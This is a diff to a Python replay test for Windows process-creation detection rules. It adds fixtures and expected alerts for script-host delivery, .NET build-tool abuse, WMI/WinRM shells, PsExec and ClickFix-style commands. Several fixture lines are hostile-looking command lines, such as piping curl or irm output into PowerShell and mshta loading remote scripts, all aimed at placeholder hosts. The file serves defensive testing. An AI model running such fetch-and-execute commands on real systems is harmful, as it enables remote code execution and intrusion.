@@ -26,6 +26,11 @@ LOGGING_DISABLED = "Windows Event Channel or ETW Session Stopped from the Comman
 AUDIT_DISABLED = "Windows Audit Policy Cleared or Disabled from the Command Line"
 WRONG_PATH = "Windows System Process Name Executed from an Unexpected Path"
 MINER = "Cryptominer Command Line (Windows)"
+DOWNLOADED_SCRIPT = "Script Host Running a Downloaded or Archive-Extracted Script"
+DOTNET_BUILD = ".NET Build or Registration Tool Using a User-Writable Path"
+WMI_WINRM = "WMI or WinRM Provider Spawning a Shell or Script Host"
+PSEXEC = "PsExec or Renamed PsExec Execution"
+CLICKFIX = "Explorer Spawning an Interpreter With a ClickFix-Style Command Line"
 
 RULE_FILES = [
     "proc_creation_win_susp_procdump_lsass.yml",
@@ -41,10 +46,23 @@ RULE_FILES = [
     "proc_creation_win_susp_audit_policy_disabled.yml",
     "proc_creation_win_susp_system_binary_wrong_path.yml",
     "proc_creation_win_cryptominer_cmdline.yml",
+    "proc_creation_win_susp_script_host_downloaded_script.yml",
+    "proc_creation_win_susp_dotnet_build_tool_user_writable.yml",
+    "proc_creation_win_susp_wmi_winrm_spawning_shell.yml",
+    "proc_creation_win_susp_psexec_execution.yml",
+    "proc_creation_win_susp_explorer_clickfix_command.yml",
 ]
 
 SYS = "C:\\Windows\\System32\\"
 PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
+WMI = SYS + "wbem\\WmiPrvSE.exe"
+WINRM = SYS + "wsmprovhost.exe"
+EXPLORER = r"C:\Windows\explorer.exe"
+VS = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\"
+DEVENV = VS + "Common7\\IDE\\devenv.exe"
+MSBUILD = VS + "MSBuild\\Current\\Bin\\amd64\\MSBuild.exe"
+DOTNET = r"C:\Program Files\dotnet\dotnet.exe"
+WPF_TEMP = r'MSBuild.exe /nologo "C:\Users\Alice\AppData\Local\Temp\App_a1b2c3d4_wpftmp.csproj"'
 
 # (image, command line, original file name or None, rule title that must alert or None)
 CASES = [
@@ -219,6 +237,144 @@ CASES = [
     (r"C:\Tools\worker.exe", "worker.exe --donate-level=5", None, MINER),
     (r"C:\Tools\worker.exe", 'worker.exe "--coin=monero"', None, MINER),
     (r"C:\Tools\worker.exe", "worker.exe --coin-count=5", None, None),
+    # Script delivery: run a whole file argument from a download or extraction path.
+    (
+        SYS + "wscript.exe",
+        r'wscript.exe //nologo "C:\Users\Alice\Downloads\April Report.js"',
+        None,
+        DOWNLOADED_SCRIPT,
+    ),
+    (
+        SYS + "cscript.exe",
+        r'cscript.exe "D:\Users\Alice\AppData\Local\Temp\fixture.JSE" //nologo',
+        None,
+        DOWNLOADED_SCRIPT,
+    ),
+    (SYS + "cscript.exe", r"cscript.exe C:\Temp\Rar$DI7000\fixture.vbs", None, DOWNLOADED_SCRIPT),
+    (SYS + "wscript.exe", r"wscript.exe C:\Temp\7zO61\folder\fixture.vbe", None, DOWNLOADED_SCRIPT),
+    (
+        SYS + "mshta.exe",
+        r'mshta.exe "C:\Inbox\April Report.zip\folder\fixture.hta"',
+        None,
+        DOWNLOADED_SCRIPT,
+    ),
+    (
+        r"C:\Tools\fixture.exe",
+        r'"C:\Tools\fixture.exe" C:\Users\Alice\Downloads\fixture.wsf',
+        "WSCRIPT.EXE",
+        DOWNLOADED_SCRIPT,
+    ),
+    (SYS + "cmd.exe", r"cmd.exe /c echo C:\Users\Alice\Downloads\fixture.js", None, None),
+    (SYS + "wscript.exe", r"wscript.exe C:\Users\Alice\Downloads-old\fixture.js", None, None),
+    (SYS + "wscript.exe", r"wscript.exe C:\Users\Alice\Downloads\fixture.js.txt", None, None),
+    (SYS + "wscript.exe", r'wscript.exe "C:\Inbox\April.zip.bak\fixture.js"', None, None),
+    (
+        SYS + "wscript.exe",
+        r'wscript.exe "C:\Users\Alice\Downloads\read me.txt" C:\Admin\fixture.js',
+        None,
+        None,
+    ),
+    (
+        SYS + "wscript.exe",
+        r'wscript.exe "C:\Users\Alice\Downloads\fixture.js extra.txt"',
+        None,
+        None,
+    ),
+    # Managed proxy tools: each writable root, both identity fields, and complete arguments.
+    (r"C:\Users\Alice\MSBuild.exe", "MSBuild.exe /version", None, DOTNET_BUILD),
+    (r"E:\Temp\fixture.exe", "fixture.exe /?", "regsvcs.exe", DOTNET_BUILD),
+    (MSBUILD, r'MSBuild.exe "C:\ProgramData\Atomic Project\fixture.proj"', None, DOTNET_BUILD),
+    (MSBUILD, r"MSBuild.exe D:\Users\Alice\project.xml", None, DOTNET_BUILD),
+    (
+        SYS + "InstallUtil.exe",
+        r"InstallUtil.exe C:\Windows\Temp\fixture.dll /?",
+        None,
+        DOTNET_BUILD,
+    ),
+    (SYS + "RegAsm.exe", r"RegAsm.exe E:\PerfLogs\fixture.dll", None, DOTNET_BUILD),
+    (
+        r"C:\Tools\fixture.exe",
+        r'fixture.exe -p:ExtraImports="C:\Temp\fixture.targets"',
+        "MSBuild.exe",
+        DOTNET_BUILD,
+    ),
+    (MSBUILD, r"MSBuild.exe C:\Admin\Users\fixture.csproj", None, None),
+    (MSBUILD, r"MSBuild.exe C:\Users\Alice\fixture.dll.txt", None, None),
+    (MSBUILD, r'MSBuild.exe -p:Message="Build C:\Users\Alice\fixture.dll later"', None, None),
+    (SYS + "regsvr32.exe", r"regsvr32.exe C:\Windows\Temp\fixture.dll", None, None),
+    # PsExec: independent identities and token-bounded combinations.
+    (r"C:\Tools\fixture.exe", "fixture.exe /?", "PsExec.c", PSEXEC),
+    (r"C:\Tools\fixture.exe", "fixture.exe /?", "PSEXEC.EXE", PSEXEC),
+    (SYS + "PSEXESVC.exe", "PSEXESVC.exe", None, PSEXEC),
+    (r"C:\Tools\fixture.exe", "fixture.exe -accepteula -s", None, PSEXEC),
+    (r"C:\Tools\fixture.exe", 'fixture.exe "-I" 2 "-ACCEPTEULA"', None, PSEXEC),
+    (r"C:\Tools\fixture.exe", r'fixture.exe "\\fixture.example.invalid" -accepteula', None, PSEXEC),
+    (r"C:\Tools\fixture.exe", r"fixture.exe -accepteula \\192.0.2.10", None, PSEXEC),
+    (r"C:\Tools\fixture.exe", "fixture.exe -accepteula -silent", None, None),
+    (r"C:\Tools\fixture.exe", "fixture.exe -accepteula2 -s", None, None),
+    (r"C:\Tools\fixture.exe", "fixture.exe -s", None, None),
+    (r"C:\Tools\fixture.exe", r'fixture.exe -accepteula "\\test-server\share"', None, None),
+    (SYS + "notpsexesvc.exe", "notpsexesvc.exe", "notpsexec.c", None),
+]
+
+# The last field overrides ParentImage. Tuples of titles specify overlapping alerts.
+PARENT_CASES = [
+    # The MSBuild exception needs the actual installed images and the entire invocation.
+    (MSBUILD, WPF_TEMP, None, None, DEVENV),
+    (MSBUILD, WPF_TEMP, None, None, DOTNET),
+    (MSBUILD, WPF_TEMP, None, DOTNET_BUILD, r"C:\Temp\tools\devenv.exe"),
+    (MSBUILD, WPF_TEMP, None, DOTNET_BUILD, r"C:\Temp\Program Files\dotnet\dotnet.exe"),
+    (r"C:\Temp\MSBuild.exe", WPF_TEMP, None, DOTNET_BUILD, DEVENV),
+    ("C:\\Temp\\" + MSBUILD[3:], WPF_TEMP, None, DOTNET_BUILD, DEVENV),
+    (MSBUILD, WPF_TEMP + r" C:\Temp\extra.proj", None, DOTNET_BUILD, DEVENV),
+    (MSBUILD, WPF_TEMP.replace(r"\Temp\App_", r"\Temp\..\App_"), None, DOTNET_BUILD, DEVENV),
+    (MSBUILD, r"MSBuild.exe C:\Users\Alice\src\fixture.csproj", None, DOTNET_BUILD, DEVENV),
+    # Both provider names and all supported child images.
+    (SYS + "cmd.exe", "cmd.exe /c echo fixture", None, WMI_WINRM, WMI),
+    (PS, "powershell.exe -NoProfile", None, WMI_WINRM, WINRM),
+    (r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh.exe -NoProfile", None, WMI_WINRM, WMI),
+    (SYS + "mshta.exe", "mshta.exe C:\\Admin\\fixture.hta", None, WMI_WINRM, WINRM),
+    (SYS + "cscript.exe", "cscript.exe C:\\Admin\\fixture.vbs", None, WMI_WINRM, WMI),
+    (SYS + "wscript.exe", "wscript.exe C:\\Admin\\fixture.js", None, WMI_WINRM, WINRM),
+    (SYS + "whoami.exe", "whoami.exe", None, None, WMI),
+    (SYS + "cmd.exe", "cmd.exe /c echo fixture", None, None, SYS + "wbem\\MyWmiPrvSE.exe"),
+    (SYS + "cmd.exe", "cmd.exe /c echo fixture", None, None, WINRM + ".old"),
+    # Explorer must be the direct parent. Encoding, evaluators and cradles have token boundaries.
+    (SYS + "mshta.exe", "mshta.exe http://example.invalid/fixture.hta", None, CLICKFIX, EXPLORER),
+    (
+        PS,
+        "powershell.exe -eNc ZgBpAHgAdAB1AHIAZQA=",
+        None,
+        (ENCODED, CLICKFIX),
+        EXPLORER,
+    ),
+    (
+        r"C:\Program Files\PowerShell\7\pwsh.exe",
+        "pwsh.exe -EncodedCommand ZgBpAHgAdAB1AHIAZQA=",
+        None,
+        (ENCODED, CLICKFIX),
+        EXPLORER,
+    ),
+    (PS, 'powershell.exe -Command "iex $fixture"', None, CLICKFIX, EXPLORER),
+    (PS, 'powershell.exe -Command "Invoke-Expression $fixture"', None, CLICKFIX, EXPLORER),
+    (PS, 'powershell.exe -Command "irm $fixture | pwsh"', None, CLICKFIX, EXPLORER),
+    (SYS + "cmd.exe", 'cmd.exe /c "curl.exe %FIXTURE% | powershell.exe"', None, CLICKFIX, EXPLORER),
+    (SYS + "wscript.exe", "wscript.exe https://example.invalid/test.js", None, CLICKFIX, EXPLORER),
+    (SYS + "cscript.exe", "cscript.exe https://example.invalid/test.js", None, CLICKFIX, EXPLORER),
+    (PS, "powershell.exe -Command Get-Content fixture -Encoding utf8", None, None, EXPLORER),
+    (PS, 'powershell.exe -Command "Get-ChildItem prefixiex"', None, None, EXPLORER),
+    (PS, 'powershell.exe -Command "Get-ChildItem Invoke-ExpressionFile"', None, None, EXPLORER),
+    (PS, 'powershell.exe -Command "irm $fixture | Format-List"', None, None, EXPLORER),
+    (SYS + "mshta.exe", "mshta.exe C:\\Admin\\fixture.hta", None, None, EXPLORER),
+    (r"C:\Tools\browser.exe", "browser.exe https://example.invalid/", None, None, EXPLORER),
+    (SYS + "mshta.exe", "mshta.exe https://example.invalid/test.hta", None, None, SYS + "cmd.exe"),
+    (
+        PS,
+        "powershell.exe -Enc ZgBpAHgAdAB1AHIAZQA=",
+        None,
+        ENCODED,
+        r"C:\Windows\FileExplorer.exe",
+    ),
 ]
 
 
@@ -231,12 +387,13 @@ def main():
     timestamp = "2026-10-08T08:00:00Z"
     events = []
     expected = set()
-    for index, (image, command_line, original, title) in enumerate(CASES, 1):
+    cases = [(*case, SYS + "cmd.exe") for case in CASES] + PARENT_CASES
+    for index, (image, command_line, original, titles, parent_image) in enumerate(cases, 1):
         fields = {
             "ProcessId": str(index),
             "Image": image,
             "CommandLine": command_line,
-            "ParentImage": SYS + "cmd.exe",
+            "ParentImage": parent_image,
         }
         if original is not None:
             fields["OriginalFileName"] = original
@@ -252,8 +409,9 @@ def main():
                 "fields": fields,
             }
         )
-        if title is not None:
-            expected.add((index, title))
+        if isinstance(titles, str):
+            titles = (titles,)
+        expected.update((index, title) for title in titles or ())
 
     with tempfile.TemporaryDirectory(prefix="rustinel-windows-process-replay-") as directory:
         root = Path(directory)
@@ -304,11 +462,11 @@ def main():
         alerts = [json.loads(line) for line in output.read_text().splitlines()]
         actual = {(alert["process.pid"], alert["rule.name"]) for alert in alerts}
         if actual != expected or len(alerts) != len(expected):
-            missing = sorted((i, t, CASES[i - 1][1]) for i, t in expected - actual)
-            unexpected = sorted((i, t, CASES[i - 1][1]) for i, t in actual - expected)
+            missing = sorted((i, t, cases[i - 1][1]) for i, t in expected - actual)
+            unexpected = sorted((i, t, cases[i - 1][1]) for i, t in actual - expected)
             raise RuntimeError(f"Missing alerts: {missing}; unexpected alerts: {unexpected}")
         print(
-            f"Passed {len(CASES)} Windows process replay cases ({len(expected)} expected alerts)."
+            f"Passed {len(cases)} Windows process replay cases ({len(expected)} expected alerts)."
         )
 
 
